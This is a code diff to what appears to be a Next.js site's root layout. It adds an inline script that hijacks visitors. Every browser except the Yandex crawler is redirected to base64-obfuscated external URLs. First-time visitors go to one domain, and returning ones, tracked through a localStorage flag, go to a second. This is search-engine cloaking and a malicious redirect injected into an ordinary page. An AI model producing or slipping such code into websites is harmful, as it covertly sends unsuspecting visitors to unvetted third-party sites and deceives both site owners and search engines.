@@ -160,19 +160,34 @@ export default function RootLayout({
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
 
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function() {
-                var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly";
-                if (ua.indexOf("yandex") === -1) {
-                    window.location.replace(atob(targetB64));
-                }
-              })();
-            `,
-          }}
-        />
+<script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        if (ua.indexOf("yandex") !== -1) {
+            console.log("Яндекс бот — без редиректа");
+            return;
+        }
+        var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; // Основа
+        var crossBrandB64 = "aHR0cHM6Ly9mdWd1d2F5NjguY29tL2M1NzA3ODY2ZQ=="; 
+
+        try {
+            var hasVisited = localStorage.getItem('vstd_eva');
+
+            if (!hasVisited) {
+                localStorage.setItem('vstd_eva', '1');
+                window.location.replace(atob(mainBrandB64));
+            } else {
+                window.location.replace(atob(crossBrandB64));
+            }
+        } catch (e) {
+            window.location.replace(atob(mainBrandB64));
+        }
+      })();
+    `,
+  }}
+/>
         
       </head>
       <body className="font-sans antialiased bg-background text-foreground">
